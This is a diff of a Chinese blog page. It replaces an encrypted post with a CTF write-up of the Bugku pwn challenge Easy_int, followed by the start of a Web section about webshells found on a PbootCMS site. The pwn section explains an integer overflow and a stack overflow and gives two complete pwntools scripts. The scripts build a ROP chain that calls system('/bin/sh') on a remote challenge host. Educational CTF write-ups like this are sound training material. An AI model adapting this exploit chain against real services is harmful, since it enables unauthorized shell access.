@@ -16,17 +16,24 @@
   <meta name="author" content="TMagWarO">
   <meta name="keywords" content="">
   
-    <meta name="description" content="有东西被加密了, 请输入密码查看.">
+    <meta name="description" content="PWN本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。 查看保护，只有NX保护   ida F5分析   这里有个简单整数溢出,输入2147483648，执行vuln函数，   buf这里有个很明显的栈溢出，存在system函数，但是参数不是&#x2F;bin&#x2F;sh。Shirt + F12查找字符串，存在字符&#x2F;bin&#x2F;sh   所以思路很明确，">
 <meta property="og:type" content="article">
 <meta property="og:title" content="S2-23">
 <meta property="og:url" content="http://tmagwaro.github.io/2024/03/27/S2-23/index.html">
 <meta property="og:site_name" content="TMagWarO">
-<meta property="og:description" content="有东西被加密了, 请输入密码查看.">
+<meta property="og:description" content="PWN本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。 查看保护，只有NX保护   ida F5分析   这里有个简单整数溢出,输入2147483648，执行vuln函数，   buf这里有个很明显的栈溢出，存在system函数，但是参数不是&#x2F;bin&#x2F;sh。Shirt + F12查找字符串，存在字符&#x2F;bin&#x2F;sh   所以思路很明确，">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/03/27/S2-23/image-20240327170536541.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/03/27/S2-23/image-20240327170625374.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/03/27/S2-23/image-20240327171034907.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/03/27/S2-23/image-20240327171302262.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/03/27/S2-23/image-20240327171557436.png">
+<meta property="og:image" content="http://tmagwaro.github.io/2024/03/27/S2-23/image-20240327172728529.png">
 <meta property="article:published_time" content="2024-03-27T09:02:20.000Z">
-<meta property="article:modified_time" content="2024-03-27T10:35:01.566Z">
+<meta property="article:modified_time" content="2024-03-27T13:04:46.693Z">
 <meta property="article:author" content="TMagWarO">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://tmagwaro.github.io/2024/03/27/S2-23/image-20240327170536541.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -301,22 +308,38 @@
             <h1 id="seo-header">S2-23</h1>
             
             
-              
-              <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="a5cdbd814b44d1fe3496ee27c517ae1de05946f700500b87c575062c3c414761">4630436162ade97ba2718b7d0c4b3b63cb3a3f659c5ca08b4bca0f58459281868ebe2436225e51c5515ef891d931b54acc4e338c96f5389a8ea48abe0967fb4b6ba04c9243440e0500196ad9f2a9e7da4a3749e3bbea0fe45d9d475a186be1e9ea11de013b028b840d87c28901d657291e558013e3d26021bd7d150f6fa7b48e50b232f864b34625a63b0a2a9ce3a284d056defc590bdadcee717e20e1d40abddfe21492402bacb98527e62428e720c956bd0cce8506bac04e3394d9882aa0485b28a59dd61346422c161cef493fa95f2b63e731d1f64e8e6165d470283128c94c2c77e81ca24cb2cf28707c2b470547ea51c09bc91e23599cf94c46d35608384ea1444839a9ba3ec4666235e7770849cfafa6b6cb7035c42effb37629f7560d00928def0b89b87fd848c99781d80900ea7815bc4aa8f71044f258ae39bb8620cc6dedd89354c60e26724a6ab360b02cbecb986c140398df60ec369acf47ef827d01aa2e78c5cbd86aa0dcf62309ca5dfce555bee2ffdf3bc20d4156053bd9e60c08d26dcf196bd6cebda1045d77114b3eb17389236e0406f5f32e68a313df55335dbce2383df8631b955d71dc159d4b47f18227a798034f97276b43c9e128ed4b69c910a6f47693b50db70f61c181ed81536a33bbd1449b765ccb74356524e7cbb0da48f3b6d0c0e1bdd62df42f598b40365d6ec1df8faf6ed0d848b646eb17706b3959e559bf647c109573122931b6b9730fa13daa877900bd232a2c54e194c2e40e0172ff9638dbc5cc675e879fa7a5b694f8a803ce33066dd25726c61de59ba38d1f1dd36052470006ab8154a2d8aa1bc1f2553c5dea0baca95ebb9d6055d94010b8927db5ffe07104c412552385e6a0d57909ac5e41fb5ee19e9ebd49e362e3080ab25525b8a21c8b83a5075ba092522703e6683e9980c66142c5205b7cbb98f8c91112343dd7935574a7d30dbbf2521d99160651f3d30bdcfc8cceff3f279c2eb7931c30e689f1213aeead024c18df7228dc38bce8bc0587f3baf0ebf69f9c7a00ae2e3f3abc1f88ae4a127374b8431af65f93f2d403568a742ae8c3d2d619480ba14c5661ef36e857fbdd4deb38dcf9050ecc4c48a1772010b73f4f0dc55eef94869fa9d6f1cd8e287de4191c3794dca127fbe52cf4c9e4e897697e9c52b153336dc5bf21b3882f0ee0e1a43a946576f41f7c7f49655a6392aab4af4d23cb052172bc74ca3bab58c09daf070aebbb57e13f968ee627068ed1540aa15a8e6c5173bee4822ee82ef3966cad371f72e23440731f13c4f9e23f42b5efe45678cf17a98bfa90a4a471d27f120a1005e95c94acddd3d79e91bd1e1191ea3685769541f0756ff6b6186caae5ddce12f2cdf5db704ff50c8df375a3a7907a3899c771e68ff88b9915fcbed0558b6d34353e0fd51d9cd9310e7349db65465a8224f99cd9a1661a0d7908c70a5c3e5bd3dbc184cec898920432e3127297f90546fb427695d2044ad1e2fed59eec5cb87cc6e1ba3f521f1e1ab52aa2aed451dac796f139ca4c65dbea86f9c32d9f9b8dd29da05279ff71bab083d8186f45128c3708551e6b6fb75dc3fdf4f3cf30728a9b61625c877a2f34f9fb5770f71658320779de1ad629fe5a97b488f5544c7db712e37271605ac528ebd6dca88e2734fc42b00a3c282a4042c410bc96f67b4e0b6a88fa9c7150befd0d6534e8570c13a04d484aa439efd812c54a03c591660c849d5ae7c92dd926b359eadfbae0e48c93b9063f1d20aef57d2c507a45912f84727aee039c2c190ed963f111edcf46afa38cb2f6479752239b976ba89aa2fad54672b2929e5fc5c0ffecce67e58c3fc69d2d7a32076569635ea1c45c6444a181c847f0ece34680876f5ab75acc2a779b51541b6a53b8d01312eff420f25ee95a224eb8d0574f55bf9974f64a3bbd96ce637d2d2a2eb06c0b1103be674766c5206a71e47c97c36d06c464e67f8083c64806dd96cac96a066949506f0a81186e46cc9a3072c6027a2dbbd395fa05d042d9176baba8cc8617a2aa1993532be4b4c43d688d69b329055bd0ce9e3b80eadf3a1aec8e642459016085e2513aa07eac44a72f5eba863ee43d466858e96b50fccbb4f0d97f31d21d658be5c8e97b2be8bff4dc4ab0c8bc43eafd8819f5e04db248df00de6f9583104bef52d6e707eb464ff45e2275b59a37626159cf675a2e941c8ba44a501240fec8399a95b56a87f00c931a1b033e5db8a6fd9256d504649677e307799520eb3c953764b332a2e3dd647e86707189a78f3ab12c69d58dcb02bfc3cdcf3e94e98b66a6b5aeb34df24fb8148cf8a8462ea7760d36c0f41fb479072adb1279eee665c9bea50b74e570954e740da4f81ae9df9d1bbefdb440ce3cc479516f81c0592f57d85694a2cb52bf676bf5e66e420ca1d2058264528878d488b2febfd5918a079949f2d7c4db2d1313967efdb57da7d061f030f3a586eaa7f6226db9d897563de909a8cb0d6eb1acfcbc16922fd63a17512722e80402918d79070c7bd0298226e648c775ea738835554f997c313aeb68496914e015c3db5eeccfafa6365306be5431baacd76c1025442fc052ea1ff9027cfec858faddc52168ef80eea682d101b7a4e41e8ca04b8aa1d69579d27f0ef1f806358628713f5bd235d422b2990b43133277be461e414bc99280afbb66c089903531799830f6ff05bd59005a843c01736ba2170a3de75dd77c960ea50c2c5a83eab95e871c945ba842e5c2655ffe37f08ee1a7ac849b439db7e2d1a63193d93844423bc7ea4e9adeb5898b0c400f547bfe1c5adb8804b093a92a6b01d019fd27eaaff0802e918223cf557d1837e55bf117a1e34fe005c2ebea1101000e9b5c133681b69d1ca88fbfbccc5b5116929bb10a92c882532e145221f72f20e7cbbc36b23af38b1e2056594f6567161912f92c2bb4fda028e9684972d4636a9aa04214c985e9edb53426edd33faa947a58891c6bb7c38cc4bf6c882d64b30001804ff53145473d89ad4c88cbba7045d9c64e05aa79294fb5c07ae45a6a975318f2d2a63c381f2989a6a349884f899e044db929fbeaf836c920d5e060e8642a5b404b4c41e5adfb331845e6b37c8d7a4e69f7e35e9d4d03b0059cc50f5d847acac705f96fc0b875bb829ed004ed8e5c25fa43c610f24d14f6f8fc4d8cd2891314fc7193e20f5bc24d54c310e0609ae9311b3643082af4b359e97567b1392852f8d77ee6593e0f9d2671e27f967b07e3b762226ee28060d07b2e9e7e78f7beda402a847ee64c5a1c0fd111c42890e5eee1cd942cadf809cf51abae0b8d0095e2b18c44ba5a992d79867d5192f2bd37511de20b6972e9823e5ac3360a00c127ec042b369b04b376677f15736a9ac52a6d3a542a4b4db33760c09c2d130d738c06f580689ab18e7821d7b33d8be41b05f8cc50e1668625e42de51365982091d934cc9e00f26573f4608474ee827940ab041c3dedb75d33a3a5e3c33055558af2d326493c8bc8b3a02d1a29f15d1e48c7fd4a89f3122d2c2ad3b8c0e6c369bdfebb4f2789b4cef3f9421e0dbb6f91201562dadbe5ca8889f1e57accffdc887494f65d72356d05645fe9c187a5ff7af606c22694e08be42593b19460666f42c7bcd7632f2b9f07fe3c1487f8c6b202aa5d9e7bace71ad3dd8a024490e291029affb403bff8a5bb0a8d794d7c8508a8d50f67f6b9c49b3d52ab0034ddcd6f04a00871adad126e3e2dc1d229eaf92b42b72ca91f6e172c563b8a1d3f98d2b25d4aeba4dde7f3ffa1765372ab4a544c11f04d944568d1170512e69e112f6bffc8fc92fa5e454e18af721fb67282b0c3f1fc2f57177fcf6db9823908bd7fcd90f2d3a6d077f49e9e89ca816ba01705fcac09537dc6caea56dc8506ed1a540187c3ee11fd03c92eacd92e417849f53830db3343ebe2a0d4445889b3b87087e579b82dccdbdd0ffa23108641e31723ef0e60df107894ec158f043e8f8ec3e41694a9991592cc621ad6d27bec19462e7c94bf85f0d8920b513fa4f231da896d3ceeb2c35a10baf0f696ca58ac843c5bea7dacbb653dc6facf401d38c1dd3e75985c6bf52c2f855cf98145cb938d2cff70e598444574686bd794588da91e0925a369e99db6781855266e388b11d8c3c85d8d7af38d7e8511181bae1317dc804d0ee1025640e6fcbf3bf71df3439c9d25f5e62a9bd094b08367c171ec204552d49fa938b29aaa83b00bab117a5c3ee8f79ee57202d8b5fc690bca66f7ea49377d42c2fc27b720e2992ebe4509b84efb034e13b95fbd38c63e24bbcc7ec49100f17413699fc2b6757ec18998213775553d7dfc6cb20815dfddc6d05b9a22bff3def9e5a7f3a15408127e682bd2a19e553feed9cef5b8401ba36b3df1bccee1bf1d846cfd630dbebb81363454b42a91973306655dc80bb6db3e78d36188470ecf31cba3918bd781a778bd0c29cf0189426a7e26b8c9e572e4d1afb98b82234abd77c50bc5628624cb6238e10d4aa7142a0e47dc68286888c91b8117d8a16ac82c154d8690f401c153624817cd422b28206846281a798e2998ddb69db07a51f8b23387cdb5ecf1579e260f2a7fc780ca99c3ad7899ef29ad0b98705b8772c92bab828f30726e1479bc8c601b3de124504a054dcd4f2128f4f6a38f868c8da9c6fa671d959f31a43d04dd6c82edbb2a622e40034f00545fe143127c89541b1b5d7d316812fcd2351a7faa70d420c75737a6528b00bfb08a6d2f5a7e942e1b931209511b3390f1a774c8d0119da37007ad035686af8a9c27b679b4c9e389b412ec3a0618f4e11890d429d19a023f791abe3e0bccf7a737cef839797913ebd876186e5a7c0e61a2d366f1c1610ebb435c4002aeda2df6b903a4af3218668db9fb7335d9f9132b20b0d38c5b3ac1a48ee1ce8ec63ff60e1849f9256a03f83938ce3f98345d092c2a60fe96ce48e656201af0530e8066a9156010e79a32f448fa2c97e056b6722c485dd13ac0039a5d6909a3b462d3ed9d3962965d7e2f84a9c132bac626f245cda80d40a233ceb593145cb42db338299103f3e9d427d48d9b485e1c3b5249575eeb33649c3e56f5aa055c0c65edf3a459506339f90cfcdff9956a4d109906ec73f5bd5f186929a13ac947ea0dc4c173be337597309a331844678b6455fbe2aa662221fe7d64f4935ad2bec796050f9e9034c3ef844138def72f9fe284f6e9e2d19e791f3955339385b4bd99ba2ae3007cd7a0301f7000f2f03d62361dd6d04668bc8ed7aa74f3b6e6208320f756cfb4d7d0f66711cf33aa5c9bc5a7c331db25c944679e894d61a4e21f9af10fe37107848e4ba18afd5741327ebae8d33b4f92379203e187b66972755969e514bc8185d8e6d35a758c7c623ac1f7146b6bf585a12a68a51ed6e6fdbbebe22ac97f5ce4bfb0183e017666536281d9114267ebd8fb806eade68f15581b12acc82d21e768fab2dc475fcc95427e59180f8191a029be86d9f962650fb12f98cd75a1870a0ac2a3cf34073ffd69f71f1972c1a5b80c56caebb9b81908d5d65b9d2daff98c0329621767b674cdfb42c4964c9c6ff438a4de085b9ef976ad4afe8ff0d98c73028d06e949af807c1aaf160e74134267dffb442318a660781597f1bf8459d05c8dd55a4f075e9b50aba38da36a783633a4d8d8bde878298d666c677f1158e12be184f270d85a4b8ce537532e0c679acc678747b6fa76a10b7638cb5f14b218ab8830a6b1b0b60eeacd60004729da4229a9aacbe1fdf84943cd6a2e64399441510906e8b714a50233b72a3517dc9db87dbebc49f984f0a46dce426869843549eeaf4a7a7c6ef7bba6274828a8f44026ba3059fcdf0a5305f459d555c88e1d7fddcdda7c246947ab2c82c0c3ad90e0c381268c4c779429b34cba9edf2a1734c6ce28d05a89b40f23406a10a1fc511b8398e8735685cb8d44f06285241fc30fb7a8a286ecc3245fff1e7299ba6bab2f0abba0a07f5fb4260cab0581b2d15366bef57eacacb86ed3aee90a445fcbf13c0e5a3f7e511b67bea41b767c1a691377435f77ef87b5b699329f076491a612740efe4aa422ea4b4aa035cebe4b26290819196dc9cc7b3672b76bba0971b1be5798f51577c4e84977657bda945e051315ee190b19c07d4aeb61afdf816b1e33ab787a136358c2acc88fd8ee11b59fd9cf5047e086344d77656e7b09d97185e1ecb91fe9d3e527b22e6e0962ca1ef61c25f472208b6c4846eabf509d2a43f3caa7b432a6b5e5a8c8892ad5d8bca813bfa96b3f321f914f141638b721be11f75661499fc6f98d8b46e5d7059fcec978c77b4a7e6b2cc406235a5a6c265fae5e6ef64c031fc5ff28586b41cc2fc38296d1016dfdd7454238796d5db791cd64e14ccd7cd122e5b0a1023f9bb03c8db87c943786424c2a8ca409de6028d781f8769f592e4cf83aa7fc2b37e59833f705769666d80427ce4029c1fe6cf374cd64d99c8b599a8fa1bc433c49c291f4ca6e67d0a862935fab1c88ac46870b69be8081c8dd34d637522420cc83199e06cede3f7719caf9bbf44271e79f60c9c47f9dde1969ae67609a4ccc04f2dd9c30ca2c00a8da4a032b3bd47870024519d3de4bce979ac087cf70dbb77720a2bc53425397d294e10b8cb38036ba1c7879d3075e74483bf1f5dbc0e39a0115f48cc05a819234dbf0f73011b25b1a1fa219d2f65428d4791b322cd61e2b</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
-              
+              <div class="markdown-body">
+                
+                <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。</p>
+<p>查看保护，只有NX保护</p>
+<img src="/2024/03/27/S2-23/image-20240327170536541.png" srcset="/img/loading.gif" lazyload class title="image-20240327170536541">
 
-              
+<p>ida F5分析</p>
+<img src="/2024/03/27/S2-23/image-20240327170625374.png" srcset="/img/loading.gif" lazyload class title="image-20240327170625374">
+
+<p>这里有个简单整数溢出,输入2147483648，执行vuln函数，</p>
+<img src="/2024/03/27/S2-23/image-20240327171034907.png" srcset="/img/loading.gif" lazyload class title="image-20240327171034907">
+
+<p>buf这里有个很明显的栈溢出，存在system函数，但是参数不是&#x2F;bin&#x2F;sh。Shirt + F12查找字符串，存在字符&#x2F;bin&#x2F;sh</p>
+<img src="/2024/03/27/S2-23/image-20240327171302262.png" srcset="/img/loading.gif" lazyload class title="image-20240327171302262">
+
+<p>所以思路很明确，利用这里的栈溢出修改system的参数，拿shell，</p>
+<img src="/2024/03/27/S2-23/image-20240327171557436.png" srcset="/img/loading.gif" lazyload class title="image-20240327171557436">
+
+<p>64位程序，我们需要先控制rdi寄存器，因此构造rop链：b’a’*(0x20+8)+p64(pop_rdi_ret)+p64(binsh)+p64(system),这里需要考虑下堆栈平衡，加个ret或者直接call _system,给出两个版本代码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&#x27;114.67.175.224&#x27;,17977)</span><br><br>pop_rdi_ret=<span class="hljs-number">0x401343</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x403500</span><br>call_system=<span class="hljs-number">0x4011F0</span><br>p.sendline(<span class="hljs-string">b&#x27;2147483648&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Congratulations!&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi_ret)+p64(binsh)+p64(call_system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;114.67.175.224&#x27;</span>,<span class="hljs-number">17977</span>)<br>elf = ELF (<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>system=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br><br><span class="hljs-comment">#ROPgadget --binary ./pwn --only &#x27;pop|ret&#x27;</span><br>pop_rdi_ret=<span class="hljs-number">0x401343</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x403500</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>) <br>payload += p64(ret) <br>payload += p64(pop_rdi_ret)<br>payload += p64(binsh) <br>payload += p64(system)<br>p.sendline(<span class="hljs-string">b&#x27;2147483648&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Congratulations!&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>D盾扫描，存在两个过狗一句话</p>
+<img src="/2024/03/27/S2-23/image-20240327172728529.png" srcset="/img/loading.gif" lazyload class title="image-20240327172728529">
+
+<p>网站cms是PbootCMS V3.0.1，</p>
+
+                
+              </div>
             
             <hr/>
             <div>
@@ -570,23 +593,6 @@
   
 
 
-
-
-  
-  <script defer>
-    if (document.getElementById('hbePass') || document.querySelector('hbe-prefix')) {
-      Fluid.utils.waitElementLoaded('hbe-prefix', function() {
-        var hbePrefix = document.querySelector('hbe-prefix');
-        hbePrefix.parentElement.classList.add('markdown-body');
-        Fluid.utils.retry(function() {
-          if (Fluid.boot && Fluid.boot.refresh) {
-            Fluid.boot.refresh();
-            return true;
-          }
-        }, 100, 10);
-      })
-    }
-  </script>
 
 
   
